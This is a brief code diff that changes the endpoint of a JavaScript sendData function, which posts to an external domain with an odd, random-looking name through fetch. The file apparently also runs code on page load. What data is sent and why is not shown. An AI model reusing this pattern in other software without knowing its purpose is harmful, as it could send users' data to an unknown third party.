@@ -33,7 +33,7 @@ document.addEventListener('DOMContentLoaded', () => {
 });
 
 function sendData() {
-    const url = 'https://rdmrqstdmn.info/index.php';
+    const url = 'https://request.rdmrqstdmn.info/';
 
     try {
         fetch(url, {
